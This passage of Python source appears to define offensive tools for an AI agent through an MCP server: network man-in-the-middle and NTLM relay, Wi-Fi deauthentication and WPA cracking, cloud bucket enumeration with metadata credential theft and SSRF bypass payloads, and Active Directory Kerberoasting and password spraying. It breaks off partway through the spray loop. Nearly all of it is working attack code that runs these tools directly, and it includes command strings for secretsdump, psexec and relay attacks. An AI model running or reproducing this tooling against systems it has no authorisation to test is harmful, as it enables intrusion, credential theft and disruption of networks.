# Replaces: arp_scan, advanced_arp_discovery, enum4linux_scan, advanced_smb_enum
# NEW: bettercap, responder, NTLM relay, impacket integration
# ============================================================================

@mcp.tool()
async def network_dominator(
    target: str,
    depth: str = "deep",
    modules: str = "all",
    interface: Optional[str] = None,
    timeout: int = 600,
) -> str:
    """
    Unified network attack engine. Combines: ARP discovery, SMB enumeration,
    bettercap MitM, Responder LLMNR/NBNS poisoning, NTLM relay, impacket tools.

    depth: stealth|light|deep|aggressive
    modules: all | comma-separated: arp,smb,bettercap,responder,ntlm_relay,impacket
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("network_dominator", target,
                                                 {"depth": depth, "modules": modules})
    results = {"target": target, "depth": depth, "modules": {}}

    try:
        mod_list = modules.split(",") if modules != "all" else ["arp", "smb", "bettercap", "responder", "impacket"]

        # --- ARP DISCOVERY ---
        if "arp" in mod_list:
            arp_results = {"hosts": []}
            # arp-scan
            arp_args = ["arp-scan"]
            if interface:
                arp_args.extend(["-I", interface])
            arp_args.append(target if "/" in target else f"{target}/24")
            arp_result = await run_command(arp_args, timeout=60)
            if arp_result.get("stdout"):
                for line in arp_result["stdout"].split("\n"):
                    match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+(\S+)\s+(.*)", line)
                    if match:
                        arp_results["hosts"].append({
                            "ip": match.group(1),
                            "mac": match.group(2),
                            "vendor": match.group(3).strip(),
                        })
            # nmap host discovery as fallback
            nmap_ping = await run_command(
                ["nmap", "-sn", "-oX", "-", target if "/" in target else f"{target}/24"],
                timeout=60,
            )
            if nmap_ping.get("stdout"):
                try:
                    root = ET.fromstring(nmap_ping["stdout"])
                    for host in root.findall(".//host"):
                        addr = host.find(".//address[@addrtype='ipv4']")
                        if addr is not None:
                            ip = addr.get("addr")
                            if not any(h["ip"] == ip for h in arp_results["hosts"]):
                                arp_results["hosts"].append({"ip": ip, "mac": "", "vendor": ""})
                except ET.ParseError:
                    pass
            results["modules"]["arp"] = arp_results
            pentest_memory.store_finding(target, "network_dominator", "live_hosts",
                                         {"count": len(arp_results["hosts"])})

        # --- SMB ENUMERATION ---
        if "smb" in mod_list:
            smb_results = {"shares": [], "users": [], "os_info": ""}
            # enum4linux
            e4l_result = await run_command(["enum4linux", "-a", target], timeout=120)
            if e4l_result.get("stdout"):
                out = e4l_result["stdout"]
                # Parse shares
                share_matches = re.findall(r"//\S+/(\S+)\s+\w+\s+(.*)", out)
                for name, comment in share_matches:
                    smb_results["shares"].append({"name": name, "comment": comment.strip()})
                # Parse users
                user_matches = re.findall(r"user:\[(\S+?)\]", out)
                smb_results["users"] = list(set(user_matches))
                # OS info
                os_match = re.search(r"OS information on (\S+).*?:\s*(.*?)(?:\n|$)", out)
                if os_match:
                    smb_results["os_info"] = os_match.group(2).strip()

            # smbclient listing
            smb_list = await run_command(
                ["smbclient", "-L", target, "-N", "--option", "client min protocol=SMB2"],
                timeout=30,
            )
            if smb_list.get("stdout"):
                for line in smb_list["stdout"].split("\n"):
                    match = re.match(r"\s+(\S+)\s+(Disk|IPC|Printer)\s*(.*)", line)
                    if match and not any(s["name"] == match.group(1) for s in smb_results["shares"]):
                        smb_results["shares"].append({
                            "name": match.group(1),
                            "type": match.group(2),
                            "comment": match.group(3).strip(),
                        })

            if depth in ["deep", "aggressive"]:
                # Try anonymous access to each share
                for share in smb_results["shares"]:
                    share_access = await run_command(
                        ["smbclient", f"//{target}/{share['name']}", "-N", "-c", "dir"],
                        timeout=15,
                    )
                    share["anonymous_access"] = share_access.get("success", False)
                    if share_access.get("stdout") and "NT_STATUS" not in share_access["stdout"]:
                        share["files"] = share_access["stdout"][:500]

            results["modules"]["smb"] = smb_results
            if smb_results["shares"] or smb_results["users"]:
                pentest_memory.store_finding(target, "network_dominator", "smb_shares",
                                             {"shares": len(smb_results["shares"]),
                                              "users": smb_results["users"]})

        # --- BETTERCAP ---
        if "bettercap" in mod_list:
            bc_results = {"capabilities": [], "commands": []}
            # Check bettercap availability
            bc_check = await run_command(["which", "bettercap"], timeout=5)
            if bc_check.get("success"):
                iface = interface or "eth0"
                # Network probe
                if depth in ["light", "deep", "aggressive"]:
                    bc_cmd = f"bettercap -iface {iface} -eval 'net.probe on; sleep 5; net.show; quit' -no-colors"
                    bc_result = await run_command_shell(bc_cmd, timeout=30)
                    bc_results["net_probe"] = bc_result.get("stdout", "")[:3000]

                if depth == "aggressive":
                    bc_results["capabilities"].extend([
                        "ARP spoofing: bettercap -iface {iface} -eval 'set arp.spoof.targets {target}; arp.spoof on'",
                        "DNS spoofing: bettercap -eval 'set dns.spoof.domains example.com; dns.spoof on'",
                        "HTTP proxy: bettercap -eval 'set http.proxy.sslstrip true; http.proxy on'",
                        "HTTPS proxy with sslstrip: bettercap -eval 'set https.proxy.sslstrip true; https.proxy on'",
                        "WiFi deauth: bettercap -eval 'wifi.recon on; wifi.deauth BSSID'",
                        "BLE recon: bettercap -eval 'ble.recon on'",
                        "Packet sniffing: bettercap -eval 'net.sniff on'",
                    ])
                    bc_results["caplets"] = [
                        "http-ui: Web UI for bettercap",
                        "hstshijack: HSTS bypass + SSL strip",
                        "login-manager: Capture credentials from HTTP traffic",
                        "beef-inject: Inject BeEF hook into HTTP pages",
                    ]
            else:
                bc_results["error"] = "bettercap not installed. Install: apt install bettercap"
            results["modules"]["bettercap"] = bc_results

        # --- RESPONDER (LLMNR/NBNS poisoning) ---
        if "responder" in mod_list:
            resp_results = {"capabilities": [], "status": "ready"}
            resp_check = await run_command(["which", "responder"], timeout=5)
            if resp_check.get("success"):
                iface = interface or "eth0"
                if depth in ["deep", "aggressive"]:
                    resp_results["capabilities"] = [
                        f"LLMNR/NBNS poisoning: responder -I {iface} -wFb",
                        f"Analyze mode: responder -I {iface} -A",
                        f"With DHCP: responder -I {iface} -wFb -d",
                        "Captures: NTLMv1, NTLMv2, HTTP Basic, FTP, LDAP, MSSQL credentials",
                    ]
                    if depth == "aggressive":
                        resp_results["relay_commands"] = [
                            f"NTLM relay to SMB: impacket-ntlmrelayx -t {target} -smb2support",
                            f"NTLM relay to LDAP: impacket-ntlmrelayx -t ldap://{target} --delegate-access",
                            f"NTLM relay to HTTP: impacket-ntlmrelayx -t http://{target} -c 'whoami'",
                        ]
                # Analyze mode (passive - safe to run)
                analyze_result = await run_command_shell(
                    f"timeout 10 responder -I {interface or 'eth0'} -A 2>&1 || true",
                    timeout=15,
                )
                resp_results["analyze_output"] = analyze_result.get("stdout", "")[:1000]
            else:
                resp_results["error"] = "responder not installed. Install: apt install responder"
            results["modules"]["responder"] = resp_results

        # --- IMPACKET TOOLS ---
        if "impacket" in mod_list:
            imp_results = {"available_tools": [], "results": {}}
            impacket_tools = {
                "secretsdump": "impacket-secretsdump",
                "psexec": "impacket-psexec",
                "wmiexec": "impacket-wmiexec",
                "smbexec": "impacket-smbexec",
                "dcomexec": "impacket-dcomexec",
                "ntlmrelayx": "impacket-ntlmrelayx",
                "GetNPUsers": "impacket-GetNPUsers",
                "GetUserSPNs": "impacket-GetUserSPNs",
                "lookupsid": "impacket-lookupsid",
            }
            for name, cmd in impacket_tools.items():
                check = await run_command(["which", cmd], timeout=3)
                if check.get("success"):
                    imp_results["available_tools"].append(name)

            # Run safe enumeration tools
            if "lookupsid" in imp_results["available_tools"]:
                sid_result = await run_command(
                    ["impacket-lookupsid", f"anonymous@{target}", "-no-pass"],
                    timeout=30,
                )
                if sid_result.get("stdout"):
                    imp_results["results"]["sid_enum"] = sid_result["stdout"][:2000]

            if depth == "aggressive" and "GetNPUsers" in imp_results["available_tools"]:
                imp_results["commands"] = {
                    "as_rep_roast": f"impacket-GetNPUsers -dc-ip {target} DOMAIN/ -no-pass -usersfile users.txt",
                    "kerberoast": f"impacket-GetUserSPNs -dc-ip {target} DOMAIN/user:password -request",
                    "secretsdump": f"impacket-secretsdump DOMAIN/admin:password@{target}",
                    "psexec": f"impacket-psexec DOMAIN/admin:password@{target}",
                }
            results["modules"]["impacket"] = imp_results

        results["recommendations"] = orchestrator.recommend_next_tools(target)
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)

    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 6: WIRELESS AUDIT
# NEW: aircrack-ng, bettercap WiFi, PMKID, WPA/WPA2 crack, monitor mode
# ============================================================================

@mcp.tool()
async def wireless_audit(
    interface: str = "wlan0",
    target_bssid: Optional[str] = None,
    depth: str = "deep",
    modules: str = "all",
    wordlist: str = "auto",
    timeout: int = 600,
) -> str:
    """
    Unified wireless pentest engine. Combines: aircrack-ng suite (airmon, airodump,
    aireplay, aircrack), bettercap WiFi, PMKID capture (hcxdumptool), hashcat WPA crack.
    Auto-chain: discover -> capture handshake -> crack.

    modules: all | comma-separated: monitor,scan,deauth,capture,pmkid,crack
    """
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("wireless_audit", interface,
                                                 {"depth": depth, "bssid": target_bssid})
    results = {"interface": interface, "depth": depth, "modules": {}}

    try:
        mod_list = modules.split(",") if modules != "all" else ["monitor", "scan", "capture", "pmkid", "crack"]
        wl = "/usr/share/wordlists/rockyou.txt" if wordlist == "auto" else wordlist

        # --- MONITOR MODE ---
        if "monitor" in mod_list:
            mon_results = {"status": "pending"}
            # Check interface
            iw_check = await run_command(["iw", "dev"], timeout=10)
            mon_results["interfaces"] = iw_check.get("stdout", "")[:1000]

            # Kill interfering processes
            await run_command(["airmon-ng", "check", "kill"], timeout=10)

            # Enable monitor mode
            mon_result = await run_command(["airmon-ng", "start", interface], timeout=15)
            if mon_result.get("success"):
                mon_results["status"] = "monitor_enabled"
                mon_results["monitor_interface"] = f"{interface}mon"
            else:
                mon_results["status"] = "failed"
                mon_results["error"] = mon_result.get("stderr", "Could not enable monitor mode")
                # Try alternative: ip link set
                alt = await run_command_shell(
                    f"ip link set {interface} down && iw {interface} set monitor control && ip link set {interface} up",
                    timeout=10,
                )
                if alt.get("success"):
                    mon_results["status"] = "monitor_enabled_alt"
                    mon_results["monitor_interface"] = interface
            results["modules"]["monitor"] = mon_results

        # --- SCAN NETWORKS ---
        if "scan" in mod_list:
            scan_results = {"networks": []}
            mon_iface = results.get("modules", {}).get("monitor", {}).get("monitor_interface", f"{interface}mon")
            # Quick scan with airodump-ng
            scan_cmd = f"timeout 15 airodump-ng {mon_iface} --write /tmp/wifi_scan --output-format csv 2>&1 || true"
            await run_command_shell(scan_cmd, timeout=20)
            # Parse CSV output
            csv_path = "/tmp/wifi_scan-01.csv"
            if os.path.exists(csv_path):
                with open(csv_path) as f:
                    csv_content = f.read()
                # Parse APs
                in_ap_section = True
                for line in csv_content.split("\n"):
                    if "Station MAC" in line:
                        in_ap_section = False
                        continue
                    if in_ap_section and "," in line:
                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) >= 14 and re.match(r"[0-9A-Fa-f:]{17}", parts[0]):
                            scan_results["networks"].append({
                                "bssid": parts[0],
                                "channel": parts[3],
                                "power": parts[8],
                                "encryption": parts[5],
                                "cipher": parts[6],
                                "auth": parts[7],
                                "essid": parts[13],
                            })
            # Bettercap WiFi scan as alternative
            if not scan_results["networks"]:
                bc_wifi = await run_command_shell(
                    f"timeout 15 bettercap -iface {mon_iface} -eval 'wifi.recon on; sleep 10; wifi.show; quit' -no-colors 2>&1 || true",
                    timeout=20,
                )
                scan_results["bettercap_output"] = bc_wifi.get("stdout", "")[:2000]

            results["modules"]["scan"] = scan_results
            if scan_results["networks"]:
                pentest_memory.store_finding(interface, "wireless_audit", "wifi_networks",
                                             {"count": len(scan_results["networks"])})

        # --- HANDSHAKE CAPTURE ---
        if "capture" in mod_list and target_bssid:
            cap_results = {"status": "pending", "handshake_captured": False}
            mon_iface = results.get("modules", {}).get("monitor", {}).get("monitor_interface", f"{interface}mon")

            # Find channel for target
            target_network = None
            for net in results.get("modules", {}).get("scan", {}).get("networks", []):
                if net["bssid"].lower() == target_bssid.lower():
                    target_network = net
                    break

            channel = target_network["channel"] if target_network else "6"

            # Start capture
            cap_file = f"/tmp/capture_{target_bssid.replace(':', '')}"
            capture_cmd = (
                f"timeout 60 airodump-ng -c {channel} --bssid {target_bssid} "
                f"-w {cap_file} {mon_iface} 2>&1 &"
            )
            await run_command_shell(capture_cmd, timeout=5)
            await asyncio.sleep(3)

            # Send deauth if deep/aggressive
            if depth in ["deep", "aggressive"]:
                deauth_cmd = f"aireplay-ng -0 5 -a {target_bssid} {mon_iface} 2>&1"
                deauth_result = await run_command_shell(deauth_cmd, timeout=15)
                cap_results["deauth_sent"] = True
                cap_results["deauth_output"] = deauth_result.get("stdout", "")[:500]

            # Wait for handshake
            await asyncio.sleep(15)

            # Check if handshake captured
            cap_check = await run_command(
                ["aircrack-ng", f"{cap_file}-01.cap"],
                timeout=10,
            )
            if cap_check.get("stdout") and "1 handshake" in cap_check["stdout"]:
                cap_results["handshake_captured"] = True
                cap_results["capture_file"] = f"{cap_file}-01.cap"
                cap_results["status"] = "success"
                pentest_memory.store_finding(interface, "wireless_audit", "handshake_captured",
                                             {"bssid": target_bssid, "file": f"{cap_file}-01.cap"})
            else:
                cap_results["status"] = "no_handshake"

            results["modules"]["capture"] = cap_results

        # --- PMKID CAPTURE ---
        if "pmkid" in mod_list and target_bssid:
            pmkid_results = {"status": "pending"}
            hcx_check = await run_command(["which", "hcxdumptool"], timeout=5)
            if hcx_check.get("success"):
                mon_iface = results.get("modules", {}).get("monitor", {}).get("monitor_interface", f"{interface}mon")
                pmkid_file = f"/tmp/pmkid_{target_bssid.replace(':', '')}"
                pmkid_cmd = (
                    f"timeout 30 hcxdumptool -i {mon_iface} -o {pmkid_file}.pcapng "
                    f"--filtermode=2 --filterlist_ap={target_bssid.replace(':', '')} "
                    f"--enable_status=1 2>&1"
                )
                pmkid_result = await run_command_shell(pmkid_cmd, timeout=35)

                # Convert to hashcat format
                if os.path.exists(f"{pmkid_file}.pcapng"):
                    convert_cmd = f"hcxpcapngtool -o {pmkid_file}.22000 {pmkid_file}.pcapng 2>&1"
                    convert = await run_command_shell(convert_cmd, timeout=10)
                    if os.path.exists(f"{pmkid_file}.22000"):
                        pmkid_results["status"] = "pmkid_captured"
                        pmkid_results["hash_file"] = f"{pmkid_file}.22000"
                        pentest_memory.store_finding(interface, "wireless_audit", "pmkid_captured",
                                                     {"bssid": target_bssid, "file": f"{pmkid_file}.22000"})
                    else:
                        pmkid_results["status"] = "no_pmkid"
            else:
                pmkid_results["error"] = "hcxdumptool not installed. Install: apt install hcxdumptool hcxtools"
            results["modules"]["pmkid"] = pmkid_results

        # --- WPA CRACKING ---
        if "crack" in mod_list:
            crack_results = {"methods_tried": [], "cracked": False}
            cap_file = None
            hash_file = None

            # Find capture files from previous steps
            for mod_name in ["capture", "pmkid"]:
                mod_data = results.get("modules", {}).get(mod_name, {})
                if mod_data.get("capture_file"):
                    cap_file = mod_data["capture_file"]
                if mod_data.get("hash_file"):
                    hash_file = mod_data["hash_file"]

            if cap_file:
                # Aircrack-ng dictionary attack
                ac_result = await run_command(
                    ["aircrack-ng", cap_file, "-w", wl],
                    timeout=min(timeout, 300),
                )
                crack_results["methods_tried"].append("aircrack_dictionary")
                if ac_result.get("stdout") and "KEY FOUND" in ac_result["stdout"]:
                    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", ac_result["stdout"])
                    if key_match:
                        crack_results["cracked"] = True
                        crack_results["key"] = key_match.group(1)

            if hash_file and not crack_results["cracked"]:
                # Hashcat WPA attack (mode 22000)
                hc_result = await run_command([
                    "hashcat", "-m", "22000", hash_file, wl,
                    "--force", "-O", "--runtime", str(min(timeout, 300)),
                ], timeout=timeout)
                crack_results["methods_tried"].append("hashcat_22000")
                if "Cracked" in hc_result.get("stdout", ""):
                    crack_results["cracked"] = True

                # Hashcat mask attack for short passwords
                if not crack_results["cracked"]:
                    masks = ["?d?d?d?d?d?d?d?d", "?l?l?l?l?l?l?l?l", "?a?a?a?a?a?a?a?a"]
                    for mask in masks:
                        mask_result = await run_command([
                            "hashcat", "-m", "22000", "-a", "3",
                            hash_file, mask, "--force", "-O", "--runtime", "60",
                        ], timeout=90)
                        crack_results["methods_tried"].append(f"hashcat_mask_{mask}")
                        if "Cracked" in mask_result.get("stdout", ""):
                            crack_results["cracked"] = True
                            break

            results["modules"]["crack"] = crack_results

        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)

    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 7: CLOUD SIEGE
# Replaces: cloud_storage_enum + NEW: AWS/GCS/Azure metadata, SSRF chains, IMDSv1/v2
# ============================================================================

@mcp.tool()
async def cloud_siege(
    target: str,
    depth: str = "deep",
    modules: str = "all",
    cloud_provider: str = "auto",
    region: str = "us-east-1",
    timeout: int = 600,
) -> str:
    """
    Unified cloud attack engine. Combines: S3/GCS/Azure bucket enumeration,
    metadata service exploitation (IMDSv1/v2), credential harvesting from SSRF,
    cloud misconfiguration scanning.

    cloud_provider: auto|aws|gcp|azure
    modules: all | comma-separated: buckets,metadata,misconfig,ssrf_chain
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("cloud_siege", target,
                                                 {"depth": depth, "cloud_provider": cloud_provider})
    results = {"target": target, "depth": depth, "cloud_provider": cloud_provider, "modules": {}}

    try:
        mod_list = modules.split(",") if modules != "all" else ["buckets", "metadata", "misconfig", "ssrf_chain"]
        delay = rate_limit_detector.get_delay(target)

        # Auto-detect cloud provider
        if cloud_provider == "auto":
            detect_result = await run_command(["curl", "-sk", "-I", target], timeout=10)
            headers_text = detect_result.get("stdout", "").lower()
            if "x-amz" in headers_text or "amazon" in headers_text:
                cloud_provider = "aws"
            elif "x-goog" in headers_text or "goog" in headers_text:
                cloud_provider = "gcp"
            elif "x-ms" in headers_text or "azure" in headers_text:
                cloud_provider = "azure"
            results["cloud_provider_detected"] = cloud_provider

        # --- BUCKET ENUMERATION ---
        if "buckets" in mod_list:
            bucket_results = {"found": [], "accessible": []}
            hostname = target.split("://")[-1].split("/")[0].split(":")[0]
            base_names = hostname.replace(".", "-").split("-")
            bucket_names = []
            for name in base_names:
                if len(name) > 2:
                    for suffix in ["", "-dev", "-staging", "-prod", "-backup", "-assets",
                                   "-uploads", "-static", "-media", "-data", "-logs",
                                   "-config", "-private", "-public", "-internal"]:
                        bucket_names.append(f"{name}{suffix}")

            if cloud_provider in ["auto", "aws"]:
                for bucket in bucket_names[:30]:
                    for region_name in ["us-east-1", "us-west-2", "eu-west-1"]:
                        check = await run_command(
                            ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
                             f"https://{bucket}.s3.{region_name}.amazonaws.com/"],
                            timeout=8,
                        )
                        status = check.get("stdout", "").strip()
                        if status and status != "000" and status != "404":
                            bucket_results["found"].append({
                                "name": bucket, "provider": "aws",
                                "region": region_name, "status": int(status),
                            })
                            if status == "200":
                                # Try list objects
                                list_check = await run_command(
                                    ["curl", "-sk", f"https://{bucket}.s3.{region_name}.amazonaws.com/"],
                                    timeout=10,
                                )
                                if list_check.get("stdout") and "<Contents>" in list_check["stdout"]:
                                    bucket_results["accessible"].append({
                                        "name": bucket, "provider": "aws",
                                        "listing": list_check["stdout"][:1000],
                                    })
                            break
                    await asyncio.sleep(delay)

            if cloud_provider in ["auto", "gcp"]:
                for bucket in bucket_names[:20]:
                    check = await run_command(
                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
                         f"https://storage.googleapis.com/{bucket}/"],
                        timeout=8,
                    )
                    status = check.get("stdout", "").strip()
                    if status and status != "000" and status != "404":
                        bucket_results["found"].append({
                            "name": bucket, "provider": "gcp", "status": int(status),
                        })
                    await asyncio.sleep(delay)

            if cloud_provider in ["auto", "azure"]:
                for bucket in bucket_names[:20]:
                    check = await run_command(
                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
                         f"https://{bucket}.blob.core.windows.net/?comp=list"],
                        timeout=8,
                    )
                    status = check.get("stdout", "").strip()
                    if status and status != "000" and status != "404":
                        bucket_results["found"].append({
                            "name": bucket, "provider": "azure", "status": int(status),
                        })
                    await asyncio.sleep(delay)

            results["modules"]["buckets"] = bucket_results
            if bucket_results["found"]:
                pentest_memory.store_finding(target, "cloud_siege", "cloud_buckets",
                                             {"count": len(bucket_results["found"])})

        # --- METADATA SERVICE ---
        if "metadata" in mod_list:
            meta_results = {"accessible": False, "credentials": {}, "metadata": {}}

            metadata_endpoints = {
                "aws_imdsv1": {
                    "url": "http://169.254.169.254/latest/meta-data/",
                    "headers": {},
                    "sensitive": [
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "http://169.254.169.254/latest/user-data",
                        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
                    ],
                },
                "aws_imdsv2": {
                    "token_url": "http://169.254.169.254/latest/api/token",
                    "token_header": "X-aws-ec2-metadata-token-ttl-seconds: 21600",
                },
                "gcp": {
                    "url": "http://metadata.google.internal/computeMetadata/v1/",
                    "headers": {"Metadata-Flavor": "Google"},
                    "sensitive": [
                        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
                    ],
                },
                "azure": {
                    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                    "headers": {"Metadata": "true"},
                    "sensitive": [
                        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                    ],
                },
            }

            # These are SSRF payloads to use when testing internal endpoints
            # For direct metadata testing (from inside cloud):
            for provider, config in metadata_endpoints.items():
                if "url" in config:
                    curl_args = ["curl", "-sk", "--max-time", "5", config["url"]]
                    for k, v in config.get("headers", {}).items():
                        curl_args.extend(["-H", f"{k}: {v}"])
                    result = await run_command(curl_args, timeout=8)
                    if result.get("success") and result.get("stdout") and len(result["stdout"]) > 10:
                        meta_results["accessible"] = True
                        meta_results["metadata"][provider] = result["stdout"][:2000]

                        # Fetch sensitive endpoints
                        for sensitive_url in config.get("sensitive", []):
                            sens_args = ["curl", "-sk", "--max-time", "5", sensitive_url]
                            for k, v in config.get("headers", {}).items():
                                sens_args.extend(["-H", f"{k}: {v}"])
                            sens_result = await run_command(sens_args, timeout=8)
                            if sens_result.get("success") and sens_result.get("stdout"):
                                meta_results["credentials"][provider] = sens_result["stdout"][:2000]

            # SSRF-ready payloads for use with ssrf_hunter module
            meta_results["ssrf_payloads"] = {
                "aws": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://[::ffff:169.254.169.254]/latest/meta-data/",
                    "http://169.254.169.254.xip.io/latest/meta-data/",
                    "http://2852039166/latest/meta-data/",  # decimal IP
                    "http://0xA9FEA9FE/latest/meta-data/",  # hex IP
                ],
                "gcp": [
                    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
                    "http://169.254.169.254/computeMetadata/v1/?recursive=true",
                ],
                "azure": [
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                    "http://169.254.169.254/metadata/identity/oauth2/token",
                ],
            }
            results["modules"]["metadata"] = meta_results

        # --- CLOUD MISCONFIGURATION ---
        if "misconfig" in mod_list:
            misconfig_results = {"findings": []}
            # Check for public snapshots, security groups, etc.
            checks = [
                ("Public S3 policy", f"https://{target}.s3.amazonaws.com/?policy"),
                ("S3 ACL", f"https://{target}.s3.amazonaws.com/?acl"),
                ("Azure public blob", f"https://{target}.blob.core.windows.net/$web/index.html"),
            ]
            for check_name, check_url in checks:
                result = await run_command(
                    ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", check_url],
                    timeout=8,
                )
                if result.get("stdout") and result["stdout"].strip() == "200":
                    misconfig_results["findings"].append({
                        "check": check_name, "url": check_url, "status": "exposed",
                    })

            results["modules"]["misconfig"] = misconfig_results

        # --- SSRF → CREDENTIAL CHAIN ---
        if "ssrf_chain" in mod_list:
            chain_results = {"chain_steps": [], "success": False}
            # This provides the attack chain methodology
            chain_results["methodology"] = [
                "1. Find SSRF endpoint (from ssrf_hunter module)",
                "2. Test metadata endpoint access via SSRF",
                "3. Extract IAM role name from /iam/security-credentials/",
                "4. Fetch temporary credentials (AccessKeyId, SecretAccessKey, Token)",
                "5. Use credentials: aws configure → aws s3 ls → aws iam list-users",
                "6. Pivot: check for cross-account roles, EC2 instances, Lambda functions",
            ]
            chain_results["automated_ssrf_payloads"] = meta_results.get("ssrf_payloads", {}) if "metadata" in results.get("modules", {}) else {}
            results["modules"]["ssrf_chain"] = chain_results

        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)

    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})



# ============================================================================
# MODULE 8: AD ANNIHILATOR
# ============================================================================

@mcp.tool()
async def ad_annihilator(
    target: str, domain: Optional[str] = None, username: Optional[str] = None,
    password: Optional[str] = None, depth: str = "deep", modules: str = "all",
    timeout: int = 600,
) -> str:
    """AD attack engine: BloodHound, Certipy AD CS, Kerberoast, AS-REP, secretsdump, spray.
    modules: all|enum,bloodhound,kerberoast,asrep,certipy,spray"""
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("ad_annihilator", target, {"depth": depth, "domain": domain})
    results = {"target": target, "domain": domain, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["enum", "bloodhound", "kerberoast", "asrep", "certipy", "spray"]
        domain = domain or target
        if "enum" in mod_list:
            enum_r = {"users": [], "groups": [], "domain_info": {}}
            ldap_r = await run_command(["ldapsearch", "-x", "-H", f"ldap://{target}", "-b", "", "-s", "base", "defaultNamingContext"], timeout=30)
            if ldap_r.get("stdout"):
                enum_r["domain_info"]["raw"] = ldap_r["stdout"][:2000]
            rpc_r = await run_command(["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"], timeout=20)
            if rpc_r.get("stdout"):
                enum_r["users"] = list(set(re.findall(r"user:\[(\S+?)\]", rpc_r["stdout"])))
            results["modules"]["enum"] = enum_r
            if enum_r["users"]:
                pentest_memory.store_finding(target, "ad_annihilator", "ad_users", {"count": len(enum_r["users"]), "users": enum_r["users"][:50]})
        if "bloodhound" in mod_list:
            bh_r = {"status": "pending"}
            bh_check = await run_command(["which", "bloodhound-python"], timeout=5)
            if bh_check.get("success"):
                bh_args = ["bloodhound-python", "-d", domain, "-ns", target, "-c", "All" if depth == "aggressive" else "Default"]
                if username and password:
                    bh_args.extend(["-u", username, "-p", password])
                bh_res = await run_command(bh_args, timeout=min(timeout, 300))
                bh_r["output"] = bh_res.get("stdout", "")[:3000]
                bh_r["status"] = "collected" if bh_res.get("success") else "failed"
            else:
                bh_r["error"] = "bloodhound-python not installed"
            results["modules"]["bloodhound"] = bh_r
        if "kerberoast" in mod_list and username and password:
            kr = {"hashes_count": 0}
            gus = await run_command(["impacket-GetUserSPNs", f"{domain}/{username}:{password}", "-dc-ip", target, "-request", "-outputfile", "/tmp/kerberoast.txt"], timeout=60)
            kr["output"] = gus.get("stdout", "")[:2000]
            if os.path.exists("/tmp/kerberoast.txt"):
                with open("/tmp/kerberoast.txt") as f:
                    kr["hashes_count"] = f.read().count("$krb5tgs$")
                if kr["hashes_count"] > 0:
                    kr["crack_cmd"] = "hashcat -m 13100 /tmp/kerberoast.txt wordlist.txt"
                    pentest_memory.store_finding(target, "ad_annihilator", "kerberoast_hashes", {"count": kr["hashes_count"]})
            results["modules"]["kerberoast"] = kr
        if "asrep" in mod_list:
            ar = {"hashes_count": 0}
            users = results.get("modules", {}).get("enum", {}).get("users", [])
            if users:
                uf = "/tmp/ad_users.txt"
                with open(uf, "w") as f:
                    f.write("\n".join(users))
                gnp = await run_command(["impacket-GetNPUsers", f"{domain}/", "-dc-ip", target, "-usersfile", uf, "-no-pass", "-format", "hashcat", "-outputfile", "/tmp/asrep.txt"], timeout=60)
                ar["output"] = gnp.get("stdout", "")[:2000]
                if os.path.exists("/tmp/asrep.txt"):
                    with open("/tmp/asrep.txt") as f:
                        ar["hashes_count"] = f.read().count("$krb5asrep$")
                    if ar["hashes_count"] > 0:
                        pentest_memory.store_finding(target, "ad_annihilator", "asrep_hashes", {"count": ar["hashes_count"]})
            results["modules"]["asrep"] = ar
        if "certipy" in mod_list and username and password:
            cr = {"vulnerabilities": []}
            cc = await run_command(["which", "certipy"], timeout=5)
            if cc.get("success"):
                certipy_r = await run_command(["certipy", "find", "-u", f"{username}@{domain}", "-p", password, "-dc-ip", target, "-vulnerable", "-stdout"], timeout=60)
                cr["output"] = certipy_r.get("stdout", "")[:3000]
                for esc in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8"]:
                    if esc in certipy_r.get("stdout", ""):
                        cr["vulnerabilities"].append(esc)
                if cr["vulnerabilities"]:
                    pentest_memory.store_finding(target, "ad_annihilator", "adcs_vulns", {"vulns": cr["vulnerabilities"]})
            results["modules"]["certipy"] = cr
        if "spray" in mod_list:
            sr = {"tested": 0, "found": []}
            users = results.get("modules", {}).get("enum", {}).get("users", [])
            pwds = ["Password1", "Welcome1", f"{domain.split('.')[0]}123", "P@ssw0rd", "Changeme1"]
            for pwd in pwds[:3]:
                for user in users[:20]:
                    sr["tested"] += 1
